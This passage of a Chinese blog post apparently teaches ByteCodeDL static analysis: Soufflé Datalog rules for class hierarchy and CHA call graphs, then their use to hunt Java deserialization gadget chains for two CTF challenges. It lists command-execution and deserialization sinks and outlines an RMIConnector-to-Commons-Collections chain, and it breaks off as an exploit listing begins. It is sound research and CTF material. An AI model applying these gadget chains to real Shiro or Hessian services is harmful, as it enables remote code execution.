+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322113307697.png" alt="image-20230322113307697"></p>
+</li>
+</ul>
+<p>查看 facts 文件可以看到每个函数的相关信息，以 <code>\t</code> 分隔。同时还记录了 method call 的行号</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322114023242.png" alt="image-20230322114023242"></p>
+<h4 id="0-内置谓词的利用-——-查找特定条件的类"><a href="#0-内置谓词的利用-——-查找特定条件的类" class="headerlink" title="0. 内置谓词的利用 ——  查找特定条件的类"></a>0. 内置谓词的利用 ——  查找特定条件的类</h4><ul>
+<li><p><strong>前置</strong></p>
+<ul>
+<li><p>Jimple 中的表示</p>
+</li>
+<li><p>souffle 提供的谓词 </p>
+<p><a target="_blank" rel="noopener" href="https://souffle-lang.github.io/constraints">https://souffle-lang.github.io/constraints</a></p>
+<ol>
+<li><p><code>contains(string1, string2)</code></p>
+<p>is used to check if the latter string contains the former string</p>
+</li>
+<li><p><code>match(&quot;a.*&quot;,x)</code></p>
+<p> is used to check if the latter string matches a wildcard pattern specified in the former string</p>
+</li>
+</ol>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322173219187.png" alt="image-20230322173219187" style="zoom:50%;"></p>
+</li>
+<li><p>需求 exp</p>
+<blockquote>
+<p>我只想找有两个构造参数的类，其中一个传入的还得是数组参数</p>
+<p>MethodInfo(method:Method, simplename:symbol, param:symbol, class:Class, return:Class, jvmDescriptor:symbol, arity:number)</p>
+</blockquote>
+<p><strong>构建规则：</strong></p>
+<ol>
+<li>方法为构造函数，<code>simplename = &lt;init&gt;</code></li>
+<li>构造参数有两个，<code>arity = 2</code></li>
+<li>参数类型为数组， <code>contains(&quot;[]&quot;, param)</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;inputDeclaration.dl&quot;</span><br><span class="line"></span><br><span class="line">.decl QueryResult(class:Class, method:Method)</span><br><span class="line">.output QueryResult</span><br><span class="line"></span><br><span class="line">QueryResult(class, method) :- </span><br><span class="line">	MethodInfo(method, simplename, param, class, _, _, arity), </span><br><span class="line">	simplename = &quot;&lt;init&gt;&quot;, </span><br><span class="line">	contains(&quot;[]&quot;, param), </span><br><span class="line">	arity = 2.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>test</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F ../../../example/out/ -D . query_test.dl </span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322174818988.png" alt="image-20230322174818988"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="1-实现-「Class-Hierarchy」"><a href="#1-实现-「Class-Hierarchy」" class="headerlink" title="1. 实现 「Class Hierarchy」"></a>1. 实现 「Class Hierarchy」</h4><blockquote>
+<p>需要构建一个<strong>类型层次图</strong>，用于寻找某个类的子类、父类，或者用于判断两个类之间是否有继承关系</p>
+</blockquote>
+<ul>
+<li><p>理论部分</p>
+<ul>
+<li><p><strong>dispatch 方法</strong></p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322144019118.png" alt="image-20230322144019118"></p>
+</li>
+<li><p><strong>Resolve 方法构建类继承结构</strong></p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322144224355.png" alt="image-20230322144224355" style="zoom:50%;"></p>
+</li>
+</ul>
+</li>
+<li><p>facts 结构</p>
+<p>其中 DirectSuperclass.facts 中提供了类的直接继承关系</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322145401439.png" alt="image-20230322145401439" style="zoom:50%;"></p>
+<p>同理，DirectSuperinterface.facts 中提供了类的直接接口实现关系</p>
+</li>
+<li><p>规则构建</p>
+<ol>
+<li><p>类继承关系的推理规则</p>
+<blockquote>
+<ol>
+<li>如果满足class x 和 y DirectSuperclass(x, y) 或者DirectSuperinterface(x, y) 那么 x , y 也一定满足 SubClass(x, y)</li>
+<li>还需要利用递推，判断非直接的层次关系。如果x 和 z 满足SubClass(x, z) 且 z 和 y 满足 DirectSuperclass(z, y) 或者DirectSuperinterface(z, y) 那么能够推导出 SubClass(x, y)</li>
+</ol>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.type Class &lt;: symbol // 类</span><br><span class="line"></span><br><span class="line">.decl ClassModifier(mod:symbol, class:Class) // 类的修饰符</span><br><span class="line">.input ClassModifier</span><br><span class="line"></span><br><span class="line">.decl ClassType(class:Class) // 是否是非接口类</span><br><span class="line">.input ClassType</span><br><span class="line"></span><br><span class="line">.decl InterfaceType(interface:Class) // 是否是 interface</span><br><span class="line">.input InterfaceType</span><br><span class="line"></span><br><span class="line">.decl DirectSuperclass(child:Class, parent:Class)</span><br><span class="line">.input DirectSuperclass</span><br><span class="line"></span><br><span class="line">.decl DirectSuperinterface(child:Class, parent:Class)</span><br><span class="line">.input DirectSuperinterface</span><br><span class="line"></span><br><span class="line">.decl SubClass(subclass:Class, class:Class) </span><br><span class="line">.output SubClass</span><br><span class="line"></span><br><span class="line">// rules</span><br><span class="line">SubClass(subclass, class) :- DirectSuperclass(subclass, class).</span><br><span class="line">SubClass(subclass, class) :- DirectSuperinterface(subclass, class).</span><br><span class="line">SubClass(subclass, class) :- </span><br><span class="line">	(</span><br><span class="line">		DirectSuperclass(subclass, tmp);</span><br><span class="line">		DirectSuperinterface(subclass, tmp)</span><br><span class="line"></span><br><span class="line">	), </span><br><span class="line">	SubClass(tmp, class).</span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322151237105.png" alt="image-20230322151237105" style="zoom:50%;"></p>
+</li>
+<li><p>dispatch 方法的规则解析：</p>
+<blockquote>
+<ol>
+<li>如果rclass中有实现方法method.sig == sig 且method没有被abstract修饰，则直接返回method</li>
+<li>如果rclass没有对应的方法实现，则需要去父类中寻找相同函数签名的方法</li>
+</ol>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Dispatch(simplename, descriptor, class, method) :-</span><br><span class="line">    MethodInfo(method, simplename, _, class, _, descriptor, _),</span><br><span class="line">    !MethodModifier(&quot;abstract&quot;, method).</span><br><span class="line">// 对应 rule 1</span><br><span class="line">Dispatch(simplename, descriptor, class, method) :-</span><br><span class="line">    !MethodInfo(_, simplename, _, class, _, descriptor, _),</span><br><span class="line">    DirectSuperclass(class, superclass),</span><br><span class="line">    Dispatch(simplename, descriptor, superclass, method),</span><br><span class="line">    !MethodModifier(&quot;abstract&quot;, method).</span><br><span class="line">  // 对应 rule 2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构建 CHA 调用图</p>
+<ul>
+<li><p>理论部分</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322163643039.png" alt="image-20230322163643039" style="zoom:50%;"></p>
+</li>
+<li><p><strong>规则构建</strong>：</p>
+<ol>
+<li>定义 <code>EntryPoint(simplename:symbol, descriptor:symbol, class:Class)</code>为入口函数</li>
+<li>把<strong>能够调用到的方法</strong>加入到 <code>Reachable(method:Method, step:number)</code> 这里限制了调用步数</li>
+<li>调用关系加入到 <code>CallGraph(insn:Insn, caller:Method, callee:Method)</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// 先根据Etrypoint解析出具体的method，加入Reachable</span><br><span class="line">Reachable(method, 0) :- </span><br><span class="line">    EntryPoint(simplename, descriptor, class),</span><br><span class="line">    Dispatch(simplename, descriptor, class, method).</span><br><span class="line"></span><br><span class="line">// special callee可以直接确定，所以可以直接加入到CallGraph</span><br><span class="line">Reachable(callee, n+1),</span><br><span class="line">CallGraph(insn, caller, callee) :-</span><br><span class="line">    // 如果caller能够调用到</span><br><span class="line">    Reachable(caller, n),</span><br><span class="line">    // 并且caller调用步数未超过最大步数</span><br><span class="line">    n &lt; MAXSTEP,</span><br><span class="line">    // 且caller 调用了 callee ，那么这些条件可以推到出callee也能访问到，且步数为n+1 调用图中caller和callee有条边</span><br><span class="line">    SpecialMethodInvocation(insn, _, callee, _, caller).</span><br><span class="line">// 同上</span><br><span class="line">Reachable(callee, n+1),</span><br><span class="line">CallGraph(insn, caller, callee) :-</span><br><span class="line">    Reachable(caller, n),</span><br><span class="line">    n &lt; MAXSTEP,</span><br><span class="line">    StaticMethodInvocation(insn, _, callee, caller).</span><br><span class="line">Reachable(callee, n+1),</span><br><span class="line">CallGraph(insn, caller, callee) :-</span><br><span class="line">    Reachable(caller, n),</span><br><span class="line">    n &lt; MAXSTEP,</span><br><span class="line">    // caller 中调用了 receiver.method() 需要根据receiver的声明类型解析</span><br><span class="line">    VirtualMethodInvocation(insn, _, method, receiver, caller),</span><br><span class="line">    // 找到method 对应的方法签名也就是simplename和descriptor</span><br><span class="line">    MethodInfo(method, simplename, _, _, _, descriptor, _),</span><br><span class="line">    // 找到receiver对应的声明类型</span><br><span class="line">    VarType(receiver, class),</span><br><span class="line">    // 找到receiver 自身及其所有的子类</span><br><span class="line">    SubEqClass(subeqclass, class),</span><br><span class="line">    // 排除被abstract修饰的类</span><br><span class="line">    !ClassModifier(&quot;abstract&quot;, subeqclass),</span><br><span class="line">    // 根据方法签名和类型解析出真正的被调函数callee</span><br><span class="line">    Dispatch(simplename, descriptor, subeqclass, callee).</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>test</p>
+<p>作者给出的根据 CHA 构建的<a target="_blank" rel="noopener" href="https://github.com/BytecodeDL/ByteCodeDL/blob/main/logic/cha.dl">调用图代码</a> 以及 RTA构建的<a target="_blank" rel="noopener" href="https://github.com/BytecodeDL/ByteCodeDL/blob/main/logic/rta.dl">调用图代码</a></p>
+<ul>
+<li><p>编写查询测试 dl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define MAXSTEP 8</span><br><span class="line"></span><br><span class="line">#include &quot;cha.dl&quot;</span><br><span class="line"></span><br><span class="line">// init entrypoint </span><br><span class="line">EntryPoint(simplename, descriptor, class) :- </span><br><span class="line">	MethodInfo(_, simplename, _, class, _, descriptor, _),</span><br><span class="line">	simplename = &quot;main&quot;, </span><br><span class="line">	descriptor = &quot;([Ljava/lang/String;)V&quot;.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>结果如下：</strong></p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230322192343203.png" alt="image-20230322192343203"></p>
+</li>
+<li><p>可视化处理</p>
+<p>作者提供了 bash 脚本可以方便的运行 neo4j 服务，并将生成的 csv 结果导入当中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash importOutput2Neo4j.sh neoImportCall.sh dbname</span><br><span class="line">neo4j / bytecodedl</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323152402675.png" alt="image-20230323152402675"></p>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h4 id="2-CHA-优化"><a href="#2-CHA-优化" class="headerlink" title="2. CHA 优化"></a>2. CHA 优化</h4><ul>
+<li><p>优化的思路实际是从 sink 点反向探索，删除掉所有不可达 sink 点的节点</p>
+<p><strong>规则定制：</strong></p>
+<ul>
+<li><p>引入新的 predicate:</p>
+<p><code>SinkReachable(method:Method, sink:Method, step:number)</code> 表示 method 经过 step 步能调用到 sink</p>
+<p>根据 <code>CallGraph(insn, caller, callee)</code> 即可剪枝</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 初始化 sink 到 sink 为 0</span><br><span class="line">SinkReachable(sink, sink, 0) :-</span><br><span class="line">    SinkMethod(sink).</span><br><span class="line"></span><br><span class="line">// 如果caller 调用 了 callee</span><br><span class="line">// 且 callee n 步到 sink</span><br><span class="line">// 那么能够推导出 caller n+1 步 能到 sink</span><br><span class="line">SinkReachable(caller, sink, n+1) :-</span><br><span class="line">    n &lt; MAXSTEP,</span><br><span class="line">    SinkReachable(callee, sink, n), </span><br><span class="line">    CallGraph(_, caller, callee).</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进一步，寻找最短路径，这里实际是遍历的方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ShortestPathToSink(entry, sink, n) :-</span><br><span class="line">    n = min step : &#123;SinkReachable(entry, sink, step)&#125;,</span><br><span class="line">    SinkMethod(sink),</span><br><span class="line">    EntryMethod(entry).</span><br></pre></td></tr></table></figure>
+<p>进一步可以递推 callee 的最小路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 如果caller 到 sink 最短距离 为 n</span><br><span class="line">// 且 calle 到 sink 的距离为 n-1</span><br><span class="line">// 且 caller 调用 callee</span><br><span class="line">// 那么可以推导出 callee 到 sink 的 最短距离为 n-1</span><br><span class="line">ShortestPathToSink(callee, sink, n-1) :-</span><br><span class="line">    n &lt; MAXSTEP + 1,</span><br><span class="line">    ShortestPathToSink(caller, sink, n),</span><br><span class="line">    SinkReachable(callee, sink, n-1),</span><br><span class="line">    CallGraph(_, caller, callee).</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用时，通过宏定义的方式来指定优化级别</p>
+<blockquote>
+<ol>
+<li><code>#define CHAO 1</code> 返回的是所有能到sink的节点</li>
+<li><code>#define CHAO 2</code> 返回的是entry到sink最短路径上的节点</li>
+<li>如果没有 CHAO 宏定义 则 返回的是entry 在 MAXSTEP之内能到达的所有节点</li>
+</ol>
+</blockquote>
+<p><strong>PS：</strong> 这里优化最短路径的目的主要在于导入图数据库当中当查询步数过大时引起时间开销的问题，因此先引入最短路径，减少节点数量和环的出现，来临时解决问题。但是这种方案一定会到只函数调用图中漏报情况出现；与之对比，tabby 在导入图数据库时用的是建立索引作优化，空间换时间</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-CHA-应用"><a href="#3-CHA-应用" class="headerlink" title="3. CHA 应用"></a>3. CHA 应用</h4><h5 id="0x1-buggyLoader-0ctf-2021-final"><a href="#0x1-buggyLoader-0ctf-2021-final" class="headerlink" title="0x1. buggyLoader 0ctf-2021-final"></a>0x1. <code>buggyLoader 0ctf-2021-final</code></h5><p>先给出这道题的背景：环境中存在 shiro-1.2.4 的依赖，并且配置文件中给出了 AES 密钥，因此允许我们构造任意序列化数据。但是这里的限制在于，环境中关于反序列化 chain 的依赖只给了 <code>commons-collection:3.2.1</code> 并且加上 shiro 利用的自定义类加载机制：<code>ClassLoader.loadClass()</code> 无法加载数组类型的 class，断绝了绝大多数的反序列化利用类。</p>
+<p>加上环境不出网，无法利用 JNDI 等一系列出网服务。所以思路转变为寻找一种二次反序列化入口点，来将最终的反序列化 gadget 转移到原生 <code>readObject()</code> 中</p>
+<blockquote>
+<p>思路：重新找个能够造成危害的public 无参函数：可以直接执行命令/代码或者能够二次反序列化</p>
+</blockquote>
+<ul>
+<li><p>复现前准备</p>
+<ul>
+<li><p>抽离出 jar 包中的所有 facts </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar soot-fact-generator.jar -i buggyloader.jar -lsystem --generate-jimple --allow-phantom --full -d ../example/out1</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>规则编写</p>
+<ol>
+<li><p>寻找所有的无参数公有函数（非构造函数且所在类可序列化）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;logic/inputDeclaration.dl&quot;</span><br><span class="line">#include &quot;logic/utils.dl&quot;</span><br><span class="line"></span><br><span class="line">.decl NonParamPublicMethod(method:Method, class:Class)</span><br><span class="line">.output NonParamPublicMethod</span><br><span class="line"></span><br><span class="line">NonParamPublicMethod(method, class) :-</span><br><span class="line">	MethodInfo(method, simplename, _, class, _, _, arity), </span><br><span class="line">	// public 修饰</span><br><span class="line">	MethodModifier(&quot;public&quot;, method), </span><br><span class="line">	// 排除构造函数</span><br><span class="line">	simplename != &quot;&lt;init&gt;&quot;, </span><br><span class="line">	// 参数为 0</span><br><span class="line">	arity = 0, </span><br><span class="line">	// 类实现了序列化接口</span><br><span class="line">	SubClass(class, &quot;java.io.Serializable&quot;). </span><br></pre></td></tr></table></figure>
+<p>运行可以看到满足条件的函数大概有 10264 个</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323201501213.png" alt="image-20230323201501213"></p>
+</li>
+<li><p>利用 CHA 调用图，筛选出可达 sink 点的函数</p>
+<p>这里限制 gadget 长度在 5 步之内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#define MAXSTEP 5</span><br><span class="line">#define CHAO 2</span><br><span class="line"></span><br><span class="line">#include &quot;logic/cha.dl&quot;</span><br><span class="line"></span><br><span class="line">.decl FinalMethod(method:Method, class:Class)</span><br><span class="line">.output FinalMethod</span><br><span class="line"></span><br><span class="line">// 常见 sink 点</span><br><span class="line">SinkDesc(&quot;exec&quot;, &quot;java.lang.Runtime&quot;).</span><br><span class="line">SinkDesc(&quot;&lt;init&gt;&quot;, &quot;java.lang.ProcessBuilder&quot;).</span><br><span class="line">SinkDesc(&quot;start&quot;, &quot;java.lang.ProcessImpl&quot;).</span><br><span class="line">SinkDesc(&quot;loadClass&quot;, &quot;java.lang.ClassLoader&quot;).</span><br><span class="line">SinkDesc(&quot;defineClass&quot;, &quot;java.lang.ClassLoader&quot;).</span><br><span class="line">SinkDesc(&quot;readObject&quot;, &quot;java.io.ObjectInputStream&quot;).</span><br><span class="line">SinkDesc(&quot;readExternal&quot;, &quot;java.io.ObjectInputStream&quot;).</span><br><span class="line"></span><br><span class="line">// 前面的 public 方法就加入到 cha 的入口函数当中</span><br><span class="line">EntryMethod(method),</span><br><span class="line">Reachable(method, 0),</span><br><span class="line">FinalMethod(method, class) :-</span><br><span class="line">	MethodInfo(method, simplename, _, class, _, _, arity), </span><br><span class="line">	// public 修饰</span><br><span class="line">	MethodModifier(&quot;public&quot;, method), </span><br><span class="line">	// 排除构造函数</span><br><span class="line">	simplename != &quot;&lt;init&gt;&quot;, </span><br><span class="line">	// 参数为 0</span><br><span class="line">	arity = 0, </span><br><span class="line">	// 类实现了序列化接口</span><br><span class="line">	SubClass(class, &quot;java.io.Serializable&quot;). </span><br><span class="line"></span><br><span class="line">.output SinkMethod</span><br></pre></td></tr></table></figure>
+<p>感觉也没加什么，就是配置了一下 sink 函数以及刚才的入口函数。通过 CHA 算法将调用图限制在 5 步之内</p>
+</li>
+<li><p>图数据库查询</p>
+<p>筛选出两步调用的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(e:entry)-[*1..2]-&gt;(s:sink) where s.method contains &quot;readObject&quot;  RETURN p</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323210044499.png" alt="image-20230323210044499"></p>
+<p>这里存在数组属性的限制</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323210149158.png" alt="image-20230323210149158"></p>
+<p>增加调用链到 4 步，这里直接将 entry 设置为 <code>javax.management.remote.rmi.RMIConnector</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(e:entry)-[*4]-&gt;(s:sink) where s.method contains &quot;readObject&quot; and ID(e)=42247 unwind nodes(p) as n return n.method</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323211404548.png" alt="image-20230323211404548"></p>
+<p>可以看到最后调用确实可以</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230323212046104.png" alt="image-20230323212046104"></p>
+<p>入口点用 InvokerTransformer 反射调用接上即可</p>
+<p><code>readOjbect -&gt; ... -&gt; InvokerTransformer -&gt; RMIConnector#connect() -&gt; .. -&gt; readObject -&gt; 传统的 CC 链</code></p>
+</li>
+</ol>
+</li>
+</ul>
+<h5 id="0x2-ezchain-hf-ctf-2022"><a href="#0x2-ezchain-hf-ctf-2022" class="headerlink" title="0x2. ezchain hf-ctf-2022"></a>0x2. ezchain hf-ctf-2022</h5><p>题目背景是 Hessian 反序列化，不出网，给了基本的 Rome 依赖。无法利用传统的 Rome 反序列化配合 JNDI 注入。需要寻找新的二次反序列化或者可直接执行代码/命令的无参 getter 函数</p>
+<ul>
+<li><p>规则编写</p>
+<p>找 getter 方法即可，注意因为 Hessian 的 <code>SerializerFactory#setAllowNonSerializable</code> 方法支持反序列化未实现 <code>Serializable</code> 接口的实例，因此无实现接口限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EntryMethod(method),</span><br><span class="line">Reachable(method, 0),</span><br><span class="line">FinalMethod(method, class) :-</span><br><span class="line">	MethodInfo(method, simplename, _, class, _, _, arity), </span><br><span class="line">	// public 修饰</span><br><span class="line">	MethodModifier(&quot;public&quot;, method), </span><br><span class="line">	// getter 方法</span><br><span class="line">	contains(&quot;get&quot;, simplename), </span><br><span class="line">	// 参数为 0</span><br><span class="line">	arity = 0. </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试</p>
+<ol>
+<li><p>生成 fact </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar soot-fact-generator.jar -i /Library/Java/JavaVirtualMachines/jdk1.8.0_91.jdk/Contents/Home/jre/lib/rt.jar -l /Library/Java/JavaVirtualMachines/jdk1.8.0_91.jdk/Contents/Home/jre/lib/rt.jar  --generate-jimple --allow-phantom --full -d ../example/ezchain</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行规则查询生成 csv</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F ezchain/ -D . gadget.dl</span><br></pre></td></tr></table></figure>
+<p>验证一下确实出了</p>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230325184335463.png" alt="image-20230325184335463"></p>
+</li>
+<li><p>导入 neo4j 当中方便查询</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash importOutput2Neo4j.sh neoImportCall.sh dbname</span><br><span class="line">neo4j / bytecodedl</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20-%20ByteCodeDL%20%E7%AF%87/image-20230329150509271.png" alt="image-20230329150509271" style="zoom:50%;"></p>
+<p>exp 这里就直接粘一个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 